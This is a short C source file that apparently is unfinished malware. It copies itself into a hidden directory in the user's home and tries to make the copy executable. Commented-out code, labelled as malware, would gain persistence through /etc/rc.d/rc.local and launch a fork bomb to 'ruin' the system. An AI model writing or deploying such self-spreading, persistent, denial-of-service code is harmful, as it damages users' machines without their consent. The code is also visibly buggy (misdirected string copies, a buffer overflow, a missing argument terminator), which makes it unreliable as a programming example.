#include <dirent.h>
#include <fcntl.h>
#include <pwd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

int main() {
	/* Determine my path */
	char* my_path = (char*)malloc( 1024 * sizeof(char) );
	getcwd( my_path, 1024 );
	sprintf( my_path, "%s/%s", my_path, __FILE__ );
	printf( "My path: %s\n", my_path );

	/* Pick a directory to latch onto */
	uid_t uid = getuid();
	struct passwd* pw = getpwuid( uid );
	DIR* d = opendir( pw->pw_dir );
	struct dirent* dir;
	struct stat buf;
	while ( ( dir = readdir( d ) ) != NULL ) {
		stat( dir->d_name, &buf );
		if ( dir->d_name[0] == '.' && strcmp( dir->d_name, "." ) && strcmp( dir->d_name, ".." ) && S_ISDIR( buf.st_mode ) ) {
			printf( "%d\n", faccessat( 0, dir->d_name, W_OK, AT_EACCESS ) );
			printf( "%s\n", dir->d_name );
			break;
		}
	}
	closedir( d );

	/* Determine target path */
	char* target_path = (char*)malloc( 1024 * sizeof(char) );
	sprintf( target_path, "%s/%s/%s", pw->pw_dir, dir->d_name, __FILE__ );
	printf( "Target path: %s\n", target_path );

	/* Check if file does not exist */
	if ( access( target_path, F_OK ) == -1 ) {
		printf( "Creating\n" );

		/* Create new file in tmp */
		FILE* f1 = fopen( target_path, "ab+" );

		/* Copy this file over to new file */
		FILE* f2 = fopen( my_path, "rb" );
		char c = fgetc( f2 );
		while ( c != EOF ) {
			fputc( c, f1 );
			c = fgetc( f2 );
		}

		/* Close files */
		fclose( f1 );
		fclose( f2 );

		/* Set permissions on file */
		char** vars;
		vars = (char**)malloc( 3 * sizeof(char*) );
		vars[0] = (char*)malloc( 5 * sizeof(char) );
		strcpy( vars[0], "chmod" );
		vars[1] = (char*)malloc( 2 * sizeof(char) );
		strcpy( vars[0], "+x" );
		vars[2] = (char*)malloc( 1024 * sizeof(char) );
		strcpy( vars[0], target_path );
		execvp( vars[0], vars );
		free( vars[0] );
		free( vars[1] );
		free( vars[2] );
		free( vars );
	}

	//TODO Get adjust privileges and get program run

	/* Set up malware to run at system start */
/*
	char** vars;
	vars = (char**)malloc( 4 * sizeof(char*) );
	vars[0] = "chmod";
	vars[1] = "+x";
	vars[2] = "/etc/rc.d/rc.local";
	vars[3] = NULL;
	execvp( vars[0], vars );
	free( vars );
*/
	printf( "Done\n" );

	/* Ruin system */
	/* Create more processes */
	/*
	while ( 1 ) {
		fork();
	}
	*/

	/* Free memory */
	free( my_path );
	free( target_path );

	return 0;
}
